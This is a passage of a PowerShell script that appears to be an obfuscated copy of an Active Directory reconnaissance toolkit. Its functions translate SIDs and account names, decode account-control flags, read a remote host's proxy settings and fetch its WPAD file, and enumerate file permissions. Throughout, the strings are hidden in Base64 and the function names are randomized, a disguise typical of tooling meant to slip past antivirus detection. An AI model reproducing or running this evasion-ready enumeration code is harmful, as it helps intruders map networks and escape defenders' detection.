                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAbwB3AGUAcgAgAFUAcwBlAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAG8AdQBuAHQAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA0ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFMAZQByAHYAZQByACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAcgBpAG4AdAAgAE8AcABlAHIAYQB0AG8AcgBzAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADEA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEIAYQBjAGsAdQBwACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADIA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIAZQBwAGwAaQBjAGEAdABvAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAcgBlAC0AVwBpAG4AZABvAHcAcwAgADIAMAAwADAAIABDAG8AbQBwAGEAdABpAGIAbABlACAAQQBjAGMAZQBzAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIAZQBtAG8AdABlACAARABlAHMAawB0AG8AcAAgAFUAcwBlAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAE4AZQB0AHcAbwByAGsAIABDAG8AbgBmAGkAZwB1AHIAYQB0AGkAbwBuACAATwBwAGUAcgBhAHQAbwByAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEkAbgBjAG8AbQBpAG4AZwAgAEYAbwByAGUAcwB0ACAAVAByAHUAcwB0ACAAQgB1AGkAbABkAGUAcgBzAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAZQByAGYAbwByAG0AYQBuAGMAZQAgAE0AbwBuAGkAdABvAHIAIABVAHMAZQByAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA1ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFAAZQByAGYAbwByAG0AYQBuAGMAZQAgAEwAbwBnACAAVQBzAGUAcgBzAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFcAaQBuAGQAbwB3AHMAIABBAHUAdABoAG8AcgBpAHoAYQB0AGkAbwBuACAAQQBjAGMAZQBzAHMAIABHAHIAbwB1AHAA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADEA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFQAZQByAG0AaQBuAGEAbAAgAFMAZQByAHYAZQByACAATABpAGMAZQBuAHMAZQAgAFMAZQByAHYAZQByAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADIA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEQAaQBzAHQAcgBpAGIAdQB0AGUAZAAgAEMATwBNACAAVQBzAGUAcgBzAA=='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA2ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEMAcgB5AHAAdABvAGcAcgBhAHAAaABpAGMAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADMA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEUAdgBlAG4AdAAgAEwAbwBnACAAUgBlAGEAZABlAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADQA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAFMAZQByAHYAaQBjAGUAIABEAEMATwBNACAAQQBjAGMAZQBzAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADUA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAAUgBlAG0AbwB0AGUAIABBAGMAYwBlAHMAcwAgAFMAZQByAHYAZQByAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADYA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAARQBuAGQAcABvAGkAbgB0ACAAUwBlAHIAdgBlAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADcA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAFIARABTACAATQBhAG4AYQBnAGUAbQBlAG4AdAAgAFMAZQByAHYAZQByAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADgA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEgAeQBwAGUAcgAtAFYAIABBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByAHMA'))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA3ADkA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAGUAcwBzACAAQwBvAG4AdAByAG8AbAAgAEEAcwBzAGkAcwB0AGEAbgBjAGUAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwAtADEALQA1AC0AMwAyAC0ANQA4ADAA')))  { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgBVAEkATABUAEkATgBcAEEAYwBjAGUAcwBzACAAQwBvAG4AdAByAG8AbAAgAEEAcwBzAGkAcwB0AGEAbgBjAGUAIABPAHAAZQByAGEAdABvAHIAcwA='))) }
                Default { 
                    $Obj = (New-Object System.Security.Principal.SecurityIdentifier($SID2))
                    $Obj.Translate( [System.Security.Principal.NTAccount]).Value
                }
            }
        }
        catch {
            $SID
        }
    }
}
function PlangintsSubrierTernes {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        $ObjectName
    )
    process {
        $ObjectName = $ObjectName -replace "/","\"
        if($ObjectName.contains("\")) {
            $Domain = $ObjectName.split("\")[0]
        }
        function HaeWistRefed([__ComObject] $Object, [String] $Method, $Parameters) {
            $Output = $Object.GetType().InvokeMember($Method, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUATQBlAHQAaABvAGQA'))), $Null, $Object, $Parameters)
            if ( $Output ) { $Output }
        }
        function VagedAistBecidae([__ComObject] $Object, [String] $Property, $Parameters) {
            [Void] $Object.GetType().InvokeMember($Property, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $Null, $Object, $Parameters)
        }
        $Translate = New-Object -ComObject NameTranslate
        try {
            HaeWistRefed $Translate $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdAA='))) (1, $Domain)
        }
        catch [System.Management.Automation.MethodInvocationException] { 
            Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAdwBpAHQAaAAgAHQAcgBhAG4AcwBsAGEAdABlACAAaQBuAGkAdAAgAGkAbgAgAEMAbwBuAHYAZQByAHQALQBOAFQANAB0AG8AQwBhAG4AbwBuAGkAYwBhAGwAOgAgACQAXwA=')))
        }
        VagedAistBecidae $Translate $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcwBlAFIAZQBmAGUAcgByAGEAbAA='))) (0x60)
        try {
            HaeWistRefed $Translate $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA'))) (3, $ObjectName)
            (HaeWistRefed $Translate $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQA'))) (2))
        }
        catch [System.Management.Automation.MethodInvocationException] {
            Write-Debug $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAdwBpAHQAaAAgAHQAcgBhAG4AcwBsAGEAdABlACAAUwBlAHQALwBHAGUAdAAgAGkAbgAgAEMAbwBuAHYAZQByAHQALQBOAFQANAB0AG8AQwBhAG4AbwBuAGkAYwBhAGwAOgAgACQAXwA=')))
        }
    }
}
function OmniaSkuhaChar {
    [CmdletBinding()]
    param(
        [String] $ObjectName
    )
    $Domain = ($ObjectName -split "@")[1]
    $ObjectName = $ObjectName -replace "/","\"
    function HaeWistRefed([__ComObject] $object, [String] $method, $parameters) {
        $output = $object.GetType().InvokeMember($method, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHYAbwBrAGUATQBlAHQAaABvAGQA'))), $NULL, $object, $parameters)
        if ( $output ) { $output }
    }
    function VagedAistBecidae([__ComObject] $object, [String] $property, $parameters) {
        [Void] $object.GetType().InvokeMember($property, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQAUAByAG8AcABlAHIAdAB5AA=='))), $NULL, $object, $parameters)
    }
    $Translate = New-Object -comobject NameTranslate
    try {
        HaeWistRefed $Translate $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAGkAdAA='))) (1, $Domain)
    }
    catch [System.Management.Automation.MethodInvocationException] { }
    VagedAistBecidae $Translate $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBoAGEAcwBlAFIAZQBmAGUAcgByAGEAbAA='))) (0x60)
    try {
        HaeWistRefed $Translate $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHQA'))) (5, $ObjectName)
        (HaeWistRefed $Translate $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQA'))) (3))
    }
    catch [System.Management.Automation.MethodInvocationException] { $_ }
}
function HeratedFarmeathyAntark {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        $Value,
        [Switch]
        $ShowAll
    )
    begin {
        $UACValues = New-Object System.Collections.Specialized.OrderedDictionary
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBDAFIASQBQAFQA'))), 1)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBDAEMATwBVAE4AVABEAEkAUwBBAEIATABFAA=='))), 2)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABPAE0ARQBEAEkAUgBfAFIARQBRAFUASQBSAEUARAA='))), 8)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABPAEMASwBPAFUAVAA='))), 16)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAEQAXwBOAE8AVABSAEUAUQBEAA=='))), 32)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAEQAXwBDAEEATgBUAF8AQwBIAEEATgBHAEUA'))), 64)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBOAEMAUgBZAFAAVABFAEQAXwBUAEUAWABUAF8AUABXAEQAXwBBAEwATABPAFcARQBEAA=='))), 128)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABFAE0AUABfAEQAVQBQAEwASQBDAEEAVABFAF8AQQBDAEMATwBVAE4AVAA='))), 256)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFIATQBBAEwAXwBBAEMAQwBPAFUATgBUAA=='))), 512)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBOAFQARQBSAEQATwBNAEEASQBOAF8AVABSAFUAUwBUAF8AQQBDAEMATwBVAE4AVAA='))), 2048)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBPAFIASwBTAFQAQQBUAEkATwBOAF8AVABSAFUAUwBUAF8AQQBDAEMATwBVAE4AVAA='))), 4096)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBFAFIAVgBFAFIAXwBUAFIAVQBTAFQAXwBBAEMAQwBPAFUATgBUAA=='))), 8192)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABPAE4AVABfAEUAWABQAEkAUgBFAF8AUABBAFMAUwBXAE8AUgBEAA=='))), 65536)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBOAFMAXwBMAE8ARwBPAE4AXwBBAEMAQwBPAFUATgBUAA=='))), 131072)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEEAUgBUAEMAQQBSAEQAXwBSAEUAUQBVAEkAUgBFAEQA'))), 262144)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAEUARABfAEYATwBSAF8ARABFAEwARQBHAEEAVABJAE8ATgA='))), 524288)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBPAFQAXwBEAEUATABFAEcAQQBUAEUARAA='))), 1048576)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBTAEUAXwBEAEUAUwBfAEsARQBZAF8ATwBOAEwAWQA='))), 2097152)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABPAE4AVABfAFIARQBRAF8AUABSAEUAQQBVAFQASAA='))), 4194304)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFMAUwBXAE8AUgBEAF8ARQBYAFAASQBSAEUARAA='))), 8388608)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABSAFUAUwBUAEUARABfAFQATwBfAEEAVQBUAEgAXwBGAE8AUgBfAEQARQBMAEUARwBBAFQASQBPAE4A'))), 16777216)
        $UACValues.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABBAFIAVABJAEEATABfAFMARQBDAFIARQBUAFMAXwBBAEMAQwBPAFUATgBUAA=='))), 67108864)
    }
    process {
        $ResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary
        if($Value -is [Int]) {
            $IntValue = $Value
        }
        if ($Value -is [PSCustomObject]) {
            if($Value.useraccountcontrol) {
                $IntValue = $Value.useraccountcontrol
            }
        }
        if($IntValue) {
            if($ShowAll) {
                foreach ($UACValue in $UACValues.GetEnumerator()) {
                    if( ($IntValue -band $UACValue.Value) -eq $UACValue.Value) {
                        $ResultUACValues.Add($UACValue.Name, ("{0}+" -f $($UACValue.Value)))
                    }
                    else {
                        $ResultUACValues.Add($UACValue.Name, ("{0}" -f $($UACValue.Value)))
                    }
                }
            }
            else {
                foreach ($UACValue in $UACValues.GetEnumerator()) {
                    if( ($IntValue -band $UACValue.Value) -eq $UACValue.Value) {
                        $ResultUACValues.Add($UACValue.Name, ("{0}" -f $($UACValue.Value)))
                    }
                }                
            }
        }
        $ResultUACValues
    }
}
function AnteruSchnicTolion {
    param(
        [Parameter(ValueFromPipeline=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerName = $ENV:COMPUTERNAME
    )
    process {
        try {
            $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwB1AHIAcgBlAG4AdABVAHMAZQByAA=='))), $ComputerName)
            $RegKey = $Reg.OpenSubkey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBPAEYAVABXAEEAUgBFAFwAXABNAGkAYwByAG8AcwBvAGYAdABcAFwAVwBpAG4AZABvAHcAcwBcAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAXABJAG4AdABlAHIAbgBlAHQAIABTAGUAdAB0AGkAbgBnAHMA'))))
            $ProxyServer = $RegKey.GetValue($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AeAB5AFMAZQByAHYAZQByAA=='))))
            $AutoConfigURL = $RegKey.GetValue($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAbwBDAG8AbgBmAGkAZwBVAFIATAA='))))
            if($AutoConfigURL -and ($AutoConfigURL -ne "")) {
                try {
                    $Wpad = (New-Object Net.Webclient).DownloadString($AutoConfigURL)
                }
                catch {
                    $Wpad = ""
                }
            }
            else {
                $Wpad = ""
            }
            if($ProxyServer -or $AutoConfigUrl) {
                $Properties = @{
                    'ProxyServer' = $ProxyServer
                    'AutoConfigURL' = $AutoConfigURL
                    'Wpad' = $Wpad
                }
                New-Object -TypeName PSObject -Property $Properties
            }
            else {
                Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvACAAcAByAG8AeAB5ACAAcwBlAHQAdABpAG4AZwBzACAAZgBvAHUAbgBkACAAZgBvAHIAIAAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlAA==')))
            }
        }
        catch {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAZQBuAHUAbQBlAHIAYQB0AGkAbgBnACAAcAByAG8AeAB5ACAAcwBlAHQAdABpAG4AZwBzACAAZgBvAHIAIAAkAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlAA==')))
        }
    }
}
function TilicalWearlingUnsities {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True)]
        [string]
        $Path,
        [Switch]
        $Recurse
    )
    begin {
        function AtrisingBeysGamism {
            [CmdletBinding()]
            param(
                [Int]
                $FSR
            )
            $AccessMask = @{
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADgAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBSAGUAYQBkAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADQAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBXAHIAaQB0AGUA')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADIAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBFAHgAZQBjAHUAdABlAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAMAAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAaQBtAHUAbQBBAGwAbABvAHcAZQBkAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMQAwADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAGMAZQBzAHMAUwB5AHMAdABlAG0AUwBlAGMAdQByAGkAdAB5AA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAxADAAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AG4AYwBoAHIAbwBuAGkAegBlAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADgAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE8AdwBuAGUAcgA=')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADQAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEQAQQBDAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADIAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABDAG8AbgB0AHIAbwBsAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADEAMAAwADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUA')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAxADAAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEEAdAB0AHIAaQBiAHUAdABlAHMA')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADgAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAHQAdAByAGkAYgB1AHQAZQBzAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADQAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAZQB0AGUAQwBoAGkAbABkAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADIAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGUAYwB1AHQAZQAvAFQAcgBhAHYAZQByAHMAZQA=')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADEAMAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEUAeAB0AGUAbgBkAGUAZABBAHQAdAByAGkAYgB1AHQAZQBzAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAOAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABFAHgAdABlAG4AZABlAGQAQQB0AHQAcgBpAGIAdQB0AGUAcwA=')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAANAA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBwAHAAZQBuAGQARABhAHQAYQAvAEEAZABkAFMAdQBiAGQAaQByAGUAYwB0AG8AcgB5AA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMgA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAEQAYQB0AGEALwBBAGQAZABGAGkAbABlAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADAAMAAwADAAMQA='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABEAGEAdABhAC8ATABpAHMAdABEAGkAcgBlAGMAdABvAHIAeQA=')))
            }
            $SimplePermissions = @{
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADEAZgAwADEAZgBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgB1AGwAbABDAG8AbgB0AHIAbwBsAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMwAwADEAYgBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAGQAaQBmAHkA')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAYQA5AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABFAHgAZQBjAHUAdABlAA==')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADEAOQBmAA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABBAG4AZABXAHIAaQB0AGUA')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMgAwADAAOAA5AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZAA=')))
              [uint32]$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4ADAAMAAwADEAMQA2AA=='))) = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAA==')))
            }
            $Permissions = @()
            $Permissions += $SimplePermissions.Keys |  % {
                              if (($FSR -band $_) -eq $_) {
                                $SimplePermissions[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }
            $Permissions += $AccessMask.Keys |
                            ? { $FSR -band $_ } |
                            % { $AccessMask[$_] }
            ($Permissions | ?{$_}) -join ","
        }
    }
    process {
        try {
            $ACL = Get-Acl -Path $Path
            $ACL.GetAccessRules($true,$true,[System.Security.Principal.SecurityIdentifier]) | % {
                $Names = @()
                if ($_.IdentityReference -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtADUALQAyADEALQBbADAALQA5AF0AKwAtAFsAMAAtADkAXQArAC0AWwAwAC0AOQBdACsALQBbADAALQA5AF0AKwA=')))) {
                    $Object = LatedCoidsuckRogues -SID $_.IdentityReference
                    $Names = @()
                    $SIDs = @($Object.objectsid)
                    if ($Recurse -and ($Object.samAccountType -ne $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAAwADUAMwAwADYAMwA2ADgA'))))) {
                        $SIDs += EspeiPersBathly -SID $Object.objectsid | select -ExpandProperty MemberSid
                    }
                    $SIDs | % {
                        $Names += ,@($_, (ElminutColatCably $_))
                    }
                }
                else {
                    $Names += ,@($_.IdentityReference.Value, (ElminutColatCably $_.IdentityReference.Value))
                }
                ForEach($Name in $Names) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHQAaAA='))) $Path
                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQBTAHkAcwB0AGUAbQBSAGkAZwBoAHQAcwA='))) (AtrisingBeysGamism -FSR $_.FileSystemRights.value__)
